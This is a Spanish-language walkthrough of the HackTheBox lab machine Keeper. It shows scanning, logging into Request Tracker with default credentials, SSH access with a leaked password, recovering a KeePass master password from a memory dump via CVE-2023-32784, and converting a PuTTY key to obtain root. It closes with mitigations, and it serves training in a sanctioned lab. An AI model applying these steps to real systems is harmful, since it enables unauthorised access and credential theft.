---
title: "Keeper - HackTheBox"
description: "Writeup de la máquina Keeper de HackTheBox, una máquina Linux fácil que involucra explotación de Request Tracker y extracción de credenciales de KeePass."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["request-tracker", "keepass", "CVE-2023-32784", "putty", "ppk"]
retired: false
logo: "/images/writeups/htb/keeper/logo.png"
heroImage: "/images/writeups/htb/keeper/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1555.003", "T1552.001"]
vulnerabilities: ["CVE-2023-32784", "default-credentials"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 horas"
points: 20
rating: 4.2
---

# Keeper - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox  
**IP**: 10.10.11.227

## Introducción

Keeper es una máquina Linux de dificultad fácil que presenta un sistema Request Tracker (RT) con credenciales por defecto. Después de obtener acceso inicial, encontraremos un archivo KeePass vulnerable a CVE-2023-32784, permitiéndonos extraer credenciales y obtener acceso root mediante una clave privada SSH en formato PuTTY.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
```

**Puertos abiertos:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Escaneo de servicios

```bash
nmap -p22,80 -sCV 10.10.11.227 -oN targeted
```

**Resultados:**
- **22/tcp** - OpenSSH 8.9p1 Ubuntu
- **80/tcp** - nginx 1.18.0

## Enumeración Web

### Acceso al sitio web

Al acceder a `http://10.10.11.227`, somos redirigidos a `http://tickets.keeper.htb/rt/`.

Agregamos al `/etc/hosts`:

```bash
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

### Request Tracker

El sitio ejecuta **Request Tracker (RT)**, un sistema de gestión de tickets.

## Explotación

### Credenciales por defecto

Probamos las credenciales por defecto de Request Tracker:
- Usuario: `root`
- Contraseña: `password`

¡Funciona! Obtenemos acceso al panel de administración.

### Enumeración de usuarios

Navegando por el panel, encontramos información sobre el usuario **lnorgaard**:

- **Username**: lnorgaard
- **Email**: lnorgaard@keeper.htb
- **Comentario**: "Initial password: Welcome2023!"

### SSH como lnorgaard

```bash
ssh lnorgaard@10.10.11.227
# Password: Welcome2023!
```

**User flag:**
```bash
cat /home/lnorgaard/user.txt
```

## Post-Explotación

### Enumeración del directorio home

```bash
ls -la /home/lnorgaard
```

Encontramos dos archivos interesantes:
- `RT30000.zip`
- `user.txt`

### Descarga del archivo ZIP

```bash
# En la máquina víctima
python3 -m http.server 8000

# En nuestra máquina
wget http://10.10.11.227:8000/RT30000.zip
```

### Análisis del archivo ZIP

```bash
unzip RT30000.zip
```

**Contenido:**
- `KeePassDumpFull.dmp` - Dump de memoria de KeePass
- `passcodes.kdbx` - Base de datos de KeePass

## Escalada de Privilegios

### CVE-2023-32784 - KeePass Master Password Dump

KeePass es vulnerable a **CVE-2023-32784**, que permite extraer la contraseña maestra de un dump de memoria.

### Herramienta de explotación

```bash
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run KeePassDumpFull.dmp
```

**Resultado parcial:**
```
Password: ●{d, M}g{r, M}ø{d, M}, {m, M}e{d, M} {f, M}l{ø, M}d{e, M}...
```

La contraseña parece ser danesa. Buscando en Google "rødgrød med fløde" (un postre danés tradicional).

**Contraseña maestra:** rødgrød med fløde

### Apertura de la base de datos KeePass

```bash
kpcli --kdb=passcodes.kdbx
# Master password: rødgrød med fløde
```

o usando KeePassXC:

```bash
keepassxc passcodes.kdbx
```

### Credenciales de root

Dentro de KeePass encontramos una entrada para `root`:

- **Usuario**: root
- **Password**: (no relevante)
- **Notes**: Contiene una clave privada PuTTY (PPK)

### Conversión de clave PPK a OpenSSH

Guardamos la clave PPK en un archivo `root.ppk` y la convertimos:

```bash
puttygen root.ppk -O private-openssh -o root_key
chmod 600 root_key
```

### SSH como root

```bash
ssh -i root_key root@10.10.11.227
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusión

Keeper es una excelente máquina para aprender sobre:
- Explotación de credenciales por defecto en aplicaciones empresariales
- Análisis de sistemas de tickets (Request Tracker)
- CVE-2023-32784 - Extracción de contraseñas maestras de KeePass
- Análisis de dumps de memoria
- Conversión de claves PuTTY a formato OpenSSH
- Gestión de credenciales y riesgos de almacenamiento

**Lecciones aprendidas:**
- Cambiar siempre las credenciales por defecto en sistemas de producción
- Los gestores de contraseñas también pueden ser vulnerables
- Los dumps de memoria pueden revelar información sensible
- La enumeración completa de aplicaciones puede revelar información crítica

**Mitigaciones:**
- Cambiar credenciales por defecto inmediatamente
- Actualizar KeePass a versiones parcheadas (2.54+)
- No almacenar claves privadas en gestores de contraseñas sin cifrado adicional
- Implementar autenticación multifactor
- Monitorear accesos y cambios en sistemas críticos
